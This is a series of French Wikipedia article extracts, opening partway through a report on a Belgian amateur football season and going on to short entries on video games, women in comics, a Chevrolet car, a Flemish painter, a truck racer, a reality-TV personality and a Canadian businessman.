Lors de l'avant-dernière journée, le Hamme (65) décroche le titre de la série. Les Flandriens comptent trois points et deux victoires d'avance sur St-Eloois-Winkel (62-17v-"+18"). Celui-ci reste sous la menace de Dender (59-156v"+27") pour le deuxième billet direct. Dender termine à Torhout, alors que Winkel reçoit le RC Mechelen qui après sa victoire ("2-1") a quitté la dernière place pour la première fois de la saison ! L'ES Acrrenoise (défaite "3-0", à Dender) a glisse au dernier rang. Grâce à son succès ("0-2") à Gullegem, le K. SV Oudenaarde est assuré d'au moins prendre part au tour final pour l'accès à la D1 Amateur.
Malgré leur position au classement, l'accès au tour final est pratiquement acquis pour Alost et La Louvière. Ceci car trois formations du "top 8" n'ont pas demandé ou obtenu la licence nécessaire pour accéder à la "D1 Amateur": St-Eloois-Winkel Sp. Petegem et le SV Temse;
Dender piégé, Acrenoise sauvé.
En raison du fait que trois formations ("St-E-Winkel", "Petegem" et "Temse") n'avaient demandé ou obtenu la licence nécessaire, l'accès au tour final ne relevait pas de grand suspense. Néanmoins, la dernière journée n'est pas dénuée d'intérêt. Piégé à Torhout ("1-0"), Dender se fait souffler la finale par Oudenaarde, victorieux ("2-1") contre Bornem. Comme le vice-champion, St-E-Winkel n'a pas de licence, Oudenaarde est qualifié d'office pour la "D1 Amateur" et Dender renvoyé au tour final.
Tour en bas de la grille, l'ES Acrenoise réussit un carton ("6-3") contre Petegem et dépasse le Racing de Malines, qui n'a pu mieux faire qu'un partage ("1-1")à Winkel. Cette relégation prend une connotation tristement historique pour le matricule 24 qui se retrouve au de la hiérarchie pour la première fois de son Histoire (il avait atteint la "Promotion", alors D2, lors de la 1909-1910 et en avait conquis le titre. Depuis 107 ans, le club n'avait connu que les trois plus hautes divisions, pour une seule en "Promotion (D4)" ("2010-2011").
Série B.
Oosterzonen (21), Beerschot-Wilrijk (20) et Bocholt (18) forment le podium après 10 journées. Ciney (17), qui a joué une rencontre de plus que le trio de tête, est quatrième. En fond de grille, Rupel Boom (8) devance trois cercles Brabançons flamands: Grimbergen (8), Woluwe-Zaventem (6) et Diegem (4).
À l'occasion des journées n°11 et n°12, Oosterzonen (23) concèdent des partages ("à Walhain 2-2" et "contre Bocholt 0-0"). Le Beerschot-Wilrijk, vainqueur du FC de Liège ("1-0"), en profite pour se hisser au premier rang (24). Bocholt (22) complète le podium devant Berchem (21) et Ciney (20) qui s'est imposé ("2-4") à Hasselt après avoir été mené deux fois. Mouvements en fin de classement, où Woluwe-Zaventem et Grimbergen (9) héritent des deux dernières places alors que Diegem Sport (10) et Rupel Boom (11) se sont donné un mince viatique.
Après le week-end de la Toussaint, Beerschot-Wilrijk (27) conforme sa prise de pouvoir car Oosterzonen (23-6v) subit sa première défaite à Hamoir ("3-2"). C'est Ciney (23-7v) qui passe au après sa victoire ("4-0") contre Cappellen. Grâce à une meilleure différence de buts, le Wallonia Walhain (22) est à la quatrième place devant Bocholt qui a sombré ("0-3") contre Hasselt.
Titre de Champion d'Automne en attente.
Le 11/11/2015, Oosterzonen confirme être le plus sérieux rival du Beerschot-Wilrijk en s'imposant ("2-1") contre le candidat déclaré au titre. Les deux formations restent au coude-à-coude jusqu'à la mi-parcours avec Bocholt sur la du podium. Derrière on retrouve Hasselt, le FC de Liège et le Wallonia Walhain. Le titre honorifique de champion automnal n'est pas attribué à la date prévue car Beerschot-Wilrijk compte une rencontre de moins, au R. RC Hamoir. Un partage suffira aux Anversois. En fond de grille, Diegem Sport (11) reste à la peine derrière Hoogstraten (15) et Grimbergen (16).
Le R. FC de Liège craque.
Arrivée à la fin février, la série reste dominée par le Beerschot-Wilrijk (53) et Oosterzonen (51) avec Bocholt (48) en léger retrait. Cappellen (47) et Hasselt (46) se sont bien replacés aux et alors que c'est Ciney (42) qui est, à ce moment, le dernier qualifié pour le "tour final". Le Wallonia Walhain et surtout le FC de Liège ("lequel, après un "1 sur 9", écarte son entraîneur Alain Bettagno pour confier la gestion de son équipe fanion à Alex Czerniatynski"), connaissent un passage à vide qui les éloignent d'une qualification. Diegem Sport (24) a quitté la dernière place qui échoie à Woluwe-Zaventem (22)
Oosterzonen tient, le Beerschot en ballotage, suspense pour le maintien.
À l'occasion du week-end de Pâques 2016 sont disputées pas moins de huit rencontres d'alignement. Cela permet évidemment de clarifier les positions au classement. On ajoute que la rencontre entre le FC Liége et Beerschot-Wilrijk , reportée trois fois, est finalement jouée le . Le "Great Old" wallon inflige sa aux nouveaux "Rats du Kiel" ("1-0"). Ceux-ci se retrouvent ainsi à la avec 59 poinrts, derrière Oosterzonen (63) et Bocholt (61) qui a joué une rencontre de plus. 
La lutte pour l'accès au tour final est bien engagée pour Hasselt et Ciney (54). Le RC Hamoir (49) occupe la dernière place qualificative mais n'a pas introduit de demande de licence pour la D1 Amateur ("e.a. pour impossibilité de mettre ses infrastructures aux conditions requises"). La septième place devient donc importante. À cet endroit, Cappellen (47-14v-33 joués) devance Sprimont (47-13v-32 joués). Le FC de Liège (46) et Berchem Sport (45) n'ont pas dit leur dernier mot alors que Walhain (44) n'a pas demandé de licence. 
On pensait Woluwe-Zaventem condamné mais celui-ci a relancé le suspense en gagnant contre Tirlemont ("3-0") et à Grimbergen ("2-3"). Si l'Union La Calamine (37) est virtuellement sauvée, la lutte reste tendue entre Tirlemont (33), Grimbergen (31), Diegem (30) et Woluwe-Zaventem (29)
A cinq pour la qualification directe, à quatre pour la descente.
À trois journées de la fin, il n'y a plus que cinq formations qui peuvent encore prétendre décrocher un des deux billets directs pour la "D1 Amateur". Les trois premiers ont une sérieuse avance: Oosterzonen (64), Beerschot-Wilrijk (62) et Bocholt (61). Les deux autres cercles sont Hasselt et Ciney (54) mais ils comptent 8 unités de retard pour 9 à prendre !
Mathématiquement Tienen (36) reste menacé, mais il a pris une solide option sur le maintien en allant gagner ("2-4") à Hamoir alors que les trois derniers s'inclinaient, Grimbergen (31), Diegem (30) et Woluwe-Zaventem (29).
Tirlemont sauvé, Hasselt et Ciney placés.
Lors de la , disputée le mercredi , Tirlemont assure son maintien en prenant un point contre Hoogstraten ("2-2"). Les trois derniers classés s'inclinent et restent donc menacés. Victorieux, Hasselt et Ciney gagnent mathématiquement leur place au tour final pour l'accession au tour final vers la "D1 Amateur". Reste à savoir si les deux clubs obtiendront la licence nécessaire. Beerschot-Wilrijk, net vainqueur ("6-0") de Hamoir, profite du nul concédé par Oosterzonen ("1-1") à Berchem Sport pour reprendre la tête au nombre de victoires. Les deux leaders comptent le même nombre de points (65) soit 4 de mieux que Bocholt qui a perdu ("3-1") à La Calamine. Enfin, le R. FC de Liège revient à la après sa victoire ("2-0") devant Woluwe-Zaventem.
Ciney et Liège en attente, Diegem relégué.
La dernière journée apporte les derniers verdicts sportifs. Battu ("2-1") par Oosterzonen, Diegem est renvoyée en "D3 Amateur". Vainqueur ("2-1") de Rupel Boom, Sprimont se qualifie pour le tour final d'accès à la "D1 Amateur". défait par Walhain ("2-3"), le R. FC de Liège doit attendre et espérer, pour être repêché, que Ciney n'obtiennent finalement pas la licence nécessaire.
Tour final spécifique.
Ce tour final offre trois places en Division 1 Amateur. Le tirage au sort des rencontres (aller/retour) est effectué le lundi vers 15h00, dans les locaux de l'URBSFA.
Attention, la participation au tour final est subordonnée à l'octroi de la licence pour la "Division A Amateur". Ce tour final se joue en deux temps. "Demi-finales" et "Finale" par série pour désigner 2 fois 1 qualifié pour la D1 Amateur. Ensuite, un repêchage entre les deux finalistes perdants afin d'attribuer le .
Programme.
Tournoi de classement.
À l'issue de "demi-finales", les équipes perdantes sont censées poursuivre avec un tournoi de classement. Cela afin d'obtenir une hiérarchie de repêchage dans le cas où des places se libéreraient aux étages supérieurs ("fusion", "arrêt d'activités", "sanction", etc.). Le tirage au sort est effectué et un planning est établi. Cependant, dès avant l'entame de ce tournoi de classement, les rencontres sont décrétées "reportées".
Résumé de la saison.
Maintien en Division 1 Amateur.
À la fin de la saison, 7 clubs gagnent le droit de rester au qui prend le nom de "Division 1 Amateur":
+ "trois clubs issus du tour final":
Relégation en Division 2 Amateur.
À la fin de la saison, 23 clubs sont directement relégués au qui prend le nom de "Division 2 Amateur":
VFV ("21 clubs").
Note:"K. Sporting Hasselt" a remporté pas le tour final et par ce c'est un club issu du Tour final VFV des Promotions qui a gagné le droit de venir en D2 Amateur.
Relégation en Division 3 Amateur.
À la fin de la saison, 2 clubs sont relégués au nouvellement créé sous le nom de "Division 3 Amateur":
Débuts en Division 3.
Trois clubs jouèrent pour la première fois au du football belge, portant à 309 le nombre de cercles différents ayant atteint ce niveau.

</doc>
<doc id="8979746" url="https://fr.wikipedia.org/wiki?curid=8979746" title="Rathsamhausen">
Rathsamhausen



</doc>
<doc id="8979748" url="https://fr.wikipedia.org/wiki?curid=8979748" title="Saguez de Breuvery">
Saguez de Breuvery



</doc>
<doc id="8979751" url="https://fr.wikipedia.org/wiki?curid=8979751" title="Salvaing de Boissieu">
Salvaing de Boissieu



</doc>
<doc id="8979753" url="https://fr.wikipedia.org/wiki?curid=8979753" title="Husson de Sampigny">
Husson de Sampigny



</doc>
<doc id="8979755" url="https://fr.wikipedia.org/wiki?curid=8979755" title="Rigaud de Vaudreuil">
Rigaud de Vaudreuil



</doc>
<doc id="8979757" url="https://fr.wikipedia.org/wiki?curid=8979757" title="Coustou">
Coustou



</doc>
<doc id="8979758" url="https://fr.wikipedia.org/wiki?curid=8979758" title="Knockin' on Heaven's Door (film)">
Knockin' on Heaven's Door (film)



</doc>
<doc id="8979763" url="https://fr.wikipedia.org/wiki?curid=8979763" title="Dezaemon">
Dezaemon

Dezaemon est une série de jeux vidéo débutée en 1991.
"Dezaemon" / "Dezaemon Plus".
 ou "Kaite Tsukutte Asoberu: Dezaemon", est un jeu vidéo de type "shoot them up" programmable en 2D sorti le sur Super Nintendo, uniquement au Japon. Le jeu a été développé et édité par Athena. Une version mise à jour est sortie en 1996 sur PlayStation sous le nom "Dezaemon Plus".
Le jeu a deux composantes : un jeu "shoot them up" et une interface de programmation originale du type Éditeur de niveau. Le jeu, intitulé "Daioh Gale" et inspiré du jeu "Daioh" du même éditeur, est à défilement vertical. L'interface de programmation est l'originalité majeure de la série "Dezaemon", avec laquelle le joueur peut créer ses propres niveaux en éditant les graphismes, le système de jeu et la bande sonore.
La version sur PlayStation vient, en plus du jeu "Daioh Gale", avec une collection de jeu créés par des joueurs à l'aide de l'interface.
"Dezaemon 3D".
"Dezaemon 3D" est un jeu vidéo de programmation et "shoot them up" sorti en 1998 sur Nintendo 64 uniquement au Japon. Le jeu a été développé et édité par Athena.
Le jeu propose de créer son propre "shoot them up" et d'y jouer.

</doc>
<doc id="8979766" url="https://fr.wikipedia.org/wiki?curid=8979766" title="Représentation des femmes dans la bande dessinée">
Représentation des femmes dans la bande dessinée

La représentation des femmes dans la bande dessinée a évolué en suivant les changements sociétaux. Par ailleurs, selon les civilisations, la représentation de la femme varie.
Historique.
La bande dessinée, dès son origine, a plutôt été créée par des hommes pour un public masculin même si des séries destinées aux jeunes filles ou aux femmes ont assez tôt été diffusées. Dans ce genre, on trouve des revues telles que "La Semaine de Suzette", "Fillette", "Lisette", "Âmes vaillantes", "Bernadette", "Line", etc.
Il y a aussi des séries sentimentales publiées dans des revues, comme "13 rue de l'Espoir" dans le journal "France-Soir", des romans dessinés dans la presse féminine ou, aux États-Unis, des romance comics. Dans ces deux cas, l'apogée du genre se situe dans les années 1950.
À côté de la bande dessinée diffusée légalement, sont diffusés, le plus souvent sous le manteau, des ouvrages pornographiques dans lesquels les personnages féminins sont présents mais toujours soumis aux désirs des hommes. Ce genre se retrouve aussi bien en Europe qu'aux États-Unis où les bibles de Tijuana parodient souvent les héros des comics ou les acteurs de cinéma.
En France, la loi du 16 juillet 1949 sur les publications destinées à la jeunesse amène les éditeurs à s'autocensurer et l'une des conséquences de cette loi est la disparition des personnages féminins. Lorsqu'elles sont montrées, c'est sous l'aspect de personnages extravagants, comme Bianca Castafiore dans les aventures de Tintin.
Une de ces rares bandes dessinées ‘anciennes’ ("Les Aventures de Jumelles"), produite par deux femmes associées (Janine Lay et Henriette Robitaillie) met en avant des protagonistes émancipées (d’après les normes de l’époque).
Les magazines de bandes dessinées, a priori généralistes, proposent au contraire des séries où les personnages principaux sont des hommes. Les femmes, lorsqu'elles sont présentes, n'ont qu'un rôle secondaire et sont assez souvent présentées avec un aspect caricatural, comme La Schtroumpfette. Deux rôles sont attribués à ces personnages : soit elles sont des sources d'ennuis, soit elles sont sans personnalité. Ceci est surtout vrai lorsqu'il s'agit de la mère du héros comme dans Boule et Bill ou Michel Vaillant. Dans les années 1960, il semble que la libération des mœurs permette aux auteurs de représenter autrement les femmes mais la misogynie est toujours à l'œuvre que ce soit en Europe ou aux États-Unis et cette pseudo-libération est en fait une reprise des clichés sexistes dominants dans la société. Ainsi en France, les personnages féminins deviennent plus sensuels suivant l'exemple de Barbarella de Jean-Claude Forest. Cependant ce personnage, créé en 1962, est victime de la censure dès 1964. Même les auteurs Comics underground comme Robert Crumb font preuve de la même misogynie au point qu'ils sont pris à partie par les féministes. Les artistes underground sont accusés de dessiner des scènes pornographiques dans lesquelles les femmes sont considérées comme seulement des objets sexuels soumis par la violence. En France, une bande dessinée contestataire, comme celle publiée dans le journal Hara-Kiri, a souvent tendance à être sexiste sous le prétexte d'être humoristique et de s'opposer à la morale bourgeoise. Cela amènera des auteurs féminines à produire leurs propres bandes dessinées pour qu'enfin une représentation libérée du carcan traditionnel existe dans la bande dessinée dans les années 70.
Mais c'est dès 1967 et le premier épisode de la série Valérian et Laureline, avec l'apparition de Laureline, qu'une évolution importante apparait. Laureline devient la complice de Valérian dans la série créée par Pierre Christin et Jean-Claude Mézières. Elle est dotée d'une forte personnalité et domine souvent Valérian : Elle est alors très atypique, alors que les héroïnes de bande dessinée sont marginales. Pour Mézières, Au delà de la force de ce personnage féminin, la série apporte également un bel exemple de relation harmonieuse dans le couple, en montrant une relation très équilibrée entre les deux héros, ce qui est sans doute une grande nouveauté. .
Suit en 1970 la pulpeuse hôtesse de l'air Natacha de François Walthéry, qui précède la japonaise Yoko Tsuno de Roger Leloup qui ne joue elle pas sur ses charmes mais plutôt son intelligence alors que ses compagnons sont des personnages d'appoint. Des personnages féminins forts suivent comme Adèle Blanc-Sec de Jacques Tardi en 1976 ou Isa, l'héroïne de la série "Les Passagers du vent" de François Bourgeon en 1979 . Ceci est une réelle révolution alors que dans le monde anglo-saxon, et surtout en Angleterre, des femmes étaient déjà les personnages principaux. Ainsi, aux États-Unis, Connie à partir de 1927 est un comic strip mettant en vedette une femme. En Angleterre, à partir des années 1950, plusieurs jeunes femmes sont les héroïnes de séries dessinées. Néanmoins, l'image de la femme continue dans la plupart des cas à être marquée par la misogynie ambiante.
Les années 1980 sont une époque de développement des personnages féminins qui sont le moteur de l'aventure comme Pélisse, l’héroïne de la Quête de l'oiseau du temps de Serge Le Tendre dont le premier tome date de 1982. La fin du a vu le retour d'une bande dessinée destinée à un lectorat féminin que l'on peut rapprocher d'une plus grande présence des femmes parmi les auteurs bien qu'au début des années 2000 elles n'en représentent qu'environ 15 %.
Représentation dans la bande dessinée européenne.
Représentation physique.
Le corps de la femme est dans la première partie du absent. La censure interdit toute représentation réaliste, supposée érotique, du corps féminin. Tout ce qui pourrait évoquer la sexualité est banni et cela se traduit, entre autres, par un rejet des personnages féminins même. L'évolution de la société dans les années 1960 et la révolution sexuelle amène l'apparition de la nudité féminine comme Barbarella dans la bande dessinée de Jean-Claude Forest. Toutefois, cela ne signifie pas que la misogynie disparaisse de la bande dessinée. Si le corps féminin était auparavant nié, il est alors mis en avant dans une forme stéréotypée et destinée au public masculin qui retrouve toujours, selon les termes de l'écrivain, scénariste et critique Benoît Peeters, le même corps gracile et le même visage éthéré.
Représentation dans les mangas.
L'image des femmes dans les mangas (bandes dessinées japonaises) varie selon les périodes et correspond à l'évolution de la place de la femme dans la société japonaise. Lorsque le rôle assigné à la femme est d'être une femme au foyer, les personnages féminins sont faibles, en retrait et en attente souvent du héros qui viendra les sauver. La libération de la femme s'accompagne d'une transformation des représentations. Les femmes sont plus actives, font preuve de plus de caractère et ne sont plus aussi souvent soumises.
Une forme particulière de la féminité, celui de l'adolescente guerrière, apparaît dans plusieurs mangas mais aussi dans des dessins animés et des jeux vidéo. Ces très jeunes filles permettent alors aux lecteurs d'assouvir des fantasmes pédophiles. En effet, de nombreux mangas destinés aux hommes ou aux adolescents présentent des jeunes femmes uniquement en tant qu'objet de désir. Cela impose une mise en avant des caractères sexuels des femmes et une représentation de femmes soumises. Selon l'âge et le sexe auquel s'adresse le manga l'aspect dominant pourra être kawaï ou pornographique avec entre ces deux extrêmes toute une palette pour évoquer la sexualité de façon plus ou moins crue.
Représentation dans les comics.
Représentation physique.
La bande dessinée américaine au début du existe seulement dans les journaux en tant que comic strips. Les personnages principaux sont souvent des enfants et les adultes lorsqu'ils apparaissent sont dessinés de façon humoristique. Hommes et femmes sont traités de la même façon mais cela change en 1909, dans une série dessinée par George McManus, "", dans laquelle si l'homme continue à avoir des traits caricaturaux et comiques, la femme est représentée de façon plus réaliste mais elle est aussi particulièrement belle. Cette opposition entre le personnage masculin et le féminin se retrouve en 1913 dans la série à succès du même auteur La Famille Illico. Les hommes sont grotesques alors que les femmes sont plus séduisantes ; la seule exception étant celle de la mère de famille qui présente un corps séduisant mais un visage comique. Cette dichotomie se retrouve fréquemment ensuite dans d'autres séries comme Blondie de Chic Young en 1930 ou Alley Oop de V.T. Hamlin en 1933 mais elle n'est cependant pas omniprésente car des auteurs comme Elzie Segar, l'auteur de Popeye représente les femmes aussi grotesques que les hommes. À l'inverse, les auteures comme Nell Brinkley, Ethel Hays, Tarpe Mills ou Dale Messick présentent des femmes et des hommes qui sont tout autant séduisants. L'homme n'est alors pas plus caricatural que la femme.
À partir de la fin du , dans les comics s'opère une transformation dans la représentation des personnages. Les super-héros sont représentés exagérément musclés alors que leur tête devient plus petite. Les femmes, quant à elles, ont des jambes très longues, des seins imposants, toujours bien ronds et parfois plus gros que leur tête et une taille très fine. Pour souligner cela, les dessinateurs les habillent avec des vêtements qui les couvrent le moins possible. Les visages des hommes comme ceux des femmes se caractérisent très souvent par un petit nez et des yeux très grands qui peuvent être dessinés sans pupilles. De tels corps impossibles existent en fait seulement pour satisfaire les désirs des lecteurs adolescents. À l'opposé dans les comics indépendant les corps des hommes et des femmes sont dessinés de la même manière qu'il s'agisse d'un style réaliste ou d'un caricatural.
Dans les comics animaliers, la différence entre les deux sexes se fait au moyen de caractères sexuels secondaires comme la longueur des cils. Ceci est vrai aussi bien au début du avec des personnages comme Minnie Mouse qu'au avec les chattes qui se retrouvent dans le comic strip Garfield.
Psychologie des personnages féminins.
Dans les années 1920 apparaît un type de personnage dont il est possible de voir l'origine dans la figure de Cendrillon : une jeune femme doit lutter pour survivre dans un environnement hostile. "Winnie Winkle" de Martin Branner publiée dans le "Chicago Tribune" à partir de 1920 ouvre la voie à ce genre d'héroïne, bientôt rejointe par "Tillie the Toiler" de Russ Westover en 1921, "Boots and Her Buddies" d'Edgar Martin de 1924 à 1969 et surtout "Little Orphan Annie" de Harold Gray qui commence aussi à paraître en 1924. Ainsi, les femmes dans les comic strips ne sont pas toujours cantonnées à un rôle secondaire, qu'il s'agisse de l'éternelle fiancée ou de la femme fatale ; elles peuvent aussi se montrer indépendantes et pleines de ressources. Ce type n'est pas limité aux années 1920 et dans les années 1950 apparaît "Juliette de mon cœur" ("") de Stan Drake (dessin) et Elliot Caplin (scénario), et dont l'héroïne est une jeune trentenaire qui parvient à s'imposer dans le monde dominé par les hommes.
Différences liées à l'âge.
La représentation de la femme n'est pas uniforme et des variations existent liées à l'âge. Ainsi, les enfants sont le plus souvent des filles agréables, loin des stéréotypes négatifs attachés aux femmes. Les femmes âgées sont aussi mieux traitées, qu'elles soient la douceur incarnée comme Mamette, ou des femmes au caractère bien trempé comme Carmen Cru. Dans les deux cas, ces héroïnes ne sont pas susceptibles d'être des sujets de séduction puisque leur corps n'est pas érotisé et elles échappent au discours misogyne.
Typologie des rôles classiques.
La femme, classiquement, est cantonnée à quelques rôles qui se résument à deux catégories. La première est celle de la femme « ordinaire » à l'instar de la femme au foyer ou la secrétaire. La seconde est celle de la « créature de rêve », éternelle fiancée ou femme fatale.
Créations féminines.
Peu à peu, des femmes se mettent à créer des bandes dessinées, art encore majoritairement masculin en France. En 1985 on ne comptait qu'une dessinatrice féminine pour vingt-cinq dessinateurs masculins, la proportion a bondi trente ans plus tard à environ 12 % d'auteures même si la parité est loin d'être atteinte.
Cependant, la création de bande dessinée par des femmes ne signifie pas que toutes les œuvres qu'elles produisent s'opposent aux modèles sexistes. Une partie importante de la création féminine est à rapprocher de la littérature "girly". Cela signifie que les héroïnes restent enfermées dans des représentations classiques ; elles se soucient surtout de plaire aux hommes, s'intéressent aux vêtements et aux conseils de beauté et ce qu'elles soient adolescentes comme "Les Nombrils" de Delaf et Maryse Dubuc ou adultes comme "Joséphine" de Pénélope Bagieu. D'après l'auteure Virginie Augustin, vice-présidente du groupement des auteurs de bande dessinée, les femmes qui créent de telles œuvres veulent décrire leur quotidien et de ce fait elles proposent d'autres clichés que ceux des auteurs masculins. Ce ne sont plus des femmes fatales ou des mères laissées dans l'ombre mais des jeunes femmes actives . On peut cependant noter l'émergence de bandes dessinées féministes, comme "Culottées" de Pénélope Bagieu et "Le Féminisme" d'Anne-Charlotte Husson et Thomas Mathieu ou des ouvrages dont le personnage principal est féminin sans que cela soit un thème majeur, comme "Carnets de thèse" de Tiphaine Rivière.

</doc>
<doc id="8979771" url="https://fr.wikipedia.org/wiki?curid=8979771" title="Chevrolet SS">
Chevrolet SS

La Chevrolet SS est une automobile produite par Chevrolet de 2013 à 2017. La marque américaine devrait l'avoir créée pour remplacer la sportive Pontiac G8, une Holden importée d'Australie, et dont elle a renouvelé l'expérience selon la même formule. Il s'agit d'une Holden Commodore rebadgée.
Caractéristiques techniques.
Motorisations.
Une nouvelle transmission manuelle à six vitesses et une transmission automatique à huit rapports ont été ajoutées pour 2015. La SS atteint en , en , et en ; elle couvre également le quart de mile en , atteignant (ou ).
Dénomination.
"SS" (Super Sport) est une ancienne appellation utilisée par Chevrolet à partir de 1961, en tant qu'option de plusieurs de ses modèles, puis graduellement abandonnée. Chevrolet ressortit ce nom en 2013 pour sa nouvelle familiale.

</doc>
<doc id="8979774" url="https://fr.wikipedia.org/wiki?curid=8979774" title="Pieter van Bloemen">
Pieter van Bloemen

Pieter van Bloemen, surnommé Standaart ou Stendardo, baptisé le à Anvers et mort le dans la même ville, est un peintre flamand. Il est le frère ainé de deux autres peintres, Jan Frans van Bloemen et Norbert van Bloemen.
Biographie.
Élève de Simon Johannes van Douw, Pieter van Bloemen est admis maître de la guilde de Saint-Luc d'Anvers en 1674, à seulement 17 ans. En 1684, il est à Lyon en compagnie de deux autres peintres hollandais, Adriaen van der Kabel et Gillis Weenix. En 1688, il est à Rome où il est inscrit, avec son frère Jan Frans, à la paroisse de Sant’Andrea delle Fratte. Ils y sont rejoints en 1690 par leur frère Norbert. Pieter rejoint alors les Bentvueghels, un groupe d'artistes flamands installés à Rome, et voyage à Naples, en Sicile et à Malte. Il revient à Anvers en 1694 et est nommé directeur de l'Académie d'Anvers en 1699.
Pieter van Bloemen a été le maître de ses jeunes frères et de Peeter van Aken et Frans van Alter.
Œuvres.
Peintre prolifique, Pieter van Bloemen est surtout connu pour ses paysages italianisants et ses compositions représentants des animaux, en particulier des chevaux, ou des scènes de genre.

</doc>
<doc id="8979782" url="https://fr.wikipedia.org/wiki?curid=8979782" title="Noero Wolff Architectes">
Noero Wolff Architectes



</doc>
<doc id="8979793" url="https://fr.wikipedia.org/wiki?curid=8979793" title="The Hunter">
The Hunter

 est le titre de plusieurs œuvres :

</doc>
<doc id="8979798" url="https://fr.wikipedia.org/wiki?curid=8979798" title="Gerd Körber">
Gerd Körber

Gerd Körber, dit "Mr. Truckrace", ou "Mr. Truckracing", né le , est un pilote de course allemand sur camions, et homme d'affaires à Rheinau (Bade-Wurtemberg).
Biographie.
Il dispute ses premières courses en karting en 1986, puis l'année suivante il pilote déjà un camion MAN de Classe B en compétition, embarquant à bord de nombreuses marques à travers trois décennies (MAN, Sisu à moteur Mercedes-Benz, DAF, Buggyra de 2001 à 2007, et désormais Iveco).
Au total il monte à 10 reprises sur un podium européen entre 1989 et 2006, malgré un grave accident de la circulation en 1995 qui faillit lui faire arrêter la course.
Il dirige l'entreprise "Bickel-Tec" axée sur l'aménagement des camions, et reste encore en activité sportive poids lourds entre 2010 et 2014 sur un Iveco du team "Schwaben-Truck", malgré une interruption de la compétition en 2008 et 2009.

</doc>
<doc id="8979799" url="https://fr.wikipedia.org/wiki?curid=8979799" title="Shekarchi">
Shekarchi



</doc>
<doc id="8979801" url="https://fr.wikipedia.org/wiki?curid=8979801" title="Loys">
Loys



</doc>
<doc id="8979803" url="https://fr.wikipedia.org/wiki?curid=8979803" title="Summerlin, Nevada">
Summerlin, Nevada



</doc>
<doc id="8979804" url="https://fr.wikipedia.org/wiki?curid=8979804" title="Realm">
Realm

Realm est un jeu d'action plates-formes de type "run and gun" en 2D, à thème de science fiction. Le jeu a été développé par Flair Software et édité par Titus Software pour la Super Nintendo. Il est sorti en Amérique du Nord en décembre 1996, suivi de l'Europe en 1997.
Synopsis.
En l'an 5069, la Terre est sur le point d'être définitivement envahie par des extra-terrestres. Le cyborg "Biomech" est le seul espoir pour les vaincre.
Système de jeu.
Le jeu est composé de 5 niveaux: la forêt, une caverne, une cité maritime, un vaisseau et un tunnel.
Le cyborg peut porter 2 armes à un instant donné, parmi un total de 9 disponibles. Des recharges et des munitions sont obtenables à partir de cristaux disposés le long des niveaux.

</doc>
<doc id="8979812" url="https://fr.wikipedia.org/wiki?curid=8979812" title="Adixia">
Adixia

Adixia est une candidate de téléréalité, influenceuse et DJ , née le à la Louvière (Belgique).
Biographie.
Née à La Louvière le , Adixia, de son vrai nom Adeline Romaniello, .
Elle a vécu à La Louvière.
Elle s'est fait connaître grâce à sa participation dans des émissions de téléréalité telles que "Les Ch'tis" et "Les Marseillais", mais elle est recalée des Anges de la téléréalité en 2013.
Adixia est également une influenceuse reconnue sur les réseaux sociaux. Avec des millions de followers, elle partage régulièrement des moments de sa vie quotidienne, des conseils beauté et mode, ainsi que des aperçus de ses voyages et de ses aventures professionnelles.
Carrière.
Téléréalité.
Adixia a commencé sa carrière télévisuelle en 2013 avec sa première émission de téléréalité, "Les Ch'tis à Hollywood". Elle a ensuite participé à plusieurs saisons des "Ch'tis" ainsi qu'à des crossover avec "Les Marseillais", renforçant sa popularité. Elle s'est également lancée dans la musique en tant que DJ.
Musique.
Elle apparaît dans le clip "Tous à poil" du rappeur bruxellois L’AB2C.
En 2015, elle fonde le duo de musique électro Pagadixx avec son ex-compagnon Paga. Ils publient ensemble des titres tels que "Just Married", "Heaven" et "Stronger". Le duo est dissous en 2017.
En 2024, elle reprend "Libertine" de Mylène Farmer.
Vie privée.
Elle est bisexuelle.
Entre 2014 et 2017, elle vit avec Anthony Paggini, dit "Paga", un DJ qu'elle a rencontré dans l'émission "Les Marseillais", et qui est également son ex-mari. De 2017 à 2020, elle est en couple avec Jim Zerga, également DJ. En mai 2021, elle est en couple avec Illan Castronovo. En 2021, elle est en couple avec Simon Castaldi, fils de Benjamin Castaldi, avec qui elle partage deux ans de relation.
Début 2025, elle annonce sa séparation avec Simon Feraud, un candidat de télé-réalité et paysagiste qu'elle a rencontré sur le tournage de "Marié(e)s à tout prix".
Le 19 mai 2025, Adixia a officialisé sa nouvelle relation avec Nicolo, également candidat de téléréalité, sur le réseau social Instagram. Selon leurs confidences, Adixia et Nicolo, d'abord amis, seraient tombés amoureux sur le tournage de "The Détective Club : Qui a volé Kiki ?", émission dont la diffusion est imminente sur la chaine W9. Ils annoncent leur relation à l'occasion du festival de Cannes.
Adixia annonce sa séparation avec Nicolo, le 15 novembre 2025. Quelques jours après il est annoncé que Adixia aurai trompé Nicolo avec son ex mari Simon Feraud, aucunes réactions n'est pour le moment intervenu auprès de la principale intéressée.

</doc>
<doc id="8979832" url="https://fr.wikipedia.org/wiki?curid=8979832" title="Patrick Moore (écologiste)">
Patrick Moore (écologiste)



</doc>
<doc id="8979838" url="https://fr.wikipedia.org/wiki?curid=8979838" title="Embranchement de la Nouvelle">
Embranchement de la Nouvelle



</doc>
<doc id="8979839" url="https://fr.wikipedia.org/wiki?curid=8979839" title="Théodose I">
Théodose I



</doc>
<doc id="8979840" url="https://fr.wikipedia.org/wiki?curid=8979840" title="Mitch Garber">
Mitch Garber

Mitch Garber, né le à Montréal, est un avocat et un entrepreneur canadien. Il est le CEO de ', une filière de ' (CACQ) qui dirige ' (dont il est également DG), ', ', ', ', ' et le "" de Baltimore.
En 2009, il est désigné par le "Global Gaming Business magazine" comme étant une des dix personnes les plus influentes dans le domaine des jeux d'argent. Il a influencé des politiques à ce sujet au Royaume-Uni et au Canada.
Biographie.
Mitch Garber obtient un baccalauréat en relations industrielles en 1986 de l'Université McGill et une licence en droit de l'Université d'Ottawa en 1989.
De 1990 à 1999, il pratique le droit dans le domaine des jeux d'argent. À la même époque, il est commentateur sportif à Montréal. Au cours des années 2000, il dirige plusieurs compagnies.
En 2015, il rejoint l'émission "Dans l'œil du dragon".
En septembre 2020, il annonce qu’il quittera la présidence du conseil d’administration du Cirque du Soleil une fois que l’entreprise passera dans les mains des créanciers.
En février 2023, il indique avoir une proposition pour prendre une participation dans le quotidien "Montreal Gazette".
Faits divers.
Des compagnies détenues entre autres par Mitch Garber font l’objet d’une poursuite d’un milliard en 2016.

</doc>
<doc id="8979850" url="https://fr.wikipedia.org/wiki?curid=8979850" title="Traductions de Jane Austen dans les langues européennes">
Traductions de Jane Austen dans les langues européennes

